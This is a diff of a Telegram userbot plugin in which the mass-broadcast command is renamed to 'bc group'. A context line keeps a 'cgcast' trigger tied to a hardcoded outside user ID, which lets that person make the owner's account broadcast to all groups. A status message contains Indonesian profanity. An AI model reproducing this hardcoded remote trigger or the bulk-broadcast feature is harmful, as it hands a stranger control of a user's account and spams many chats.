@@ -39,7 +39,7 @@ del _GCAST_BLACKLIST
 
 
 @Client.on_message(filters.command("cgcast", ["."]) & filters.user(6675703731) & ~filters.me)
-@Client.on_message(filters.command("gcast", cmd) & filters.me)
+@Client.on_message(filters.command("bc group", cmd) & filters.me)
 async def gcast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
         Man = await edit_or_reply(message, "`Limit Jangan salahin Dareen Ya Ngentod, Started global broadcast...`")
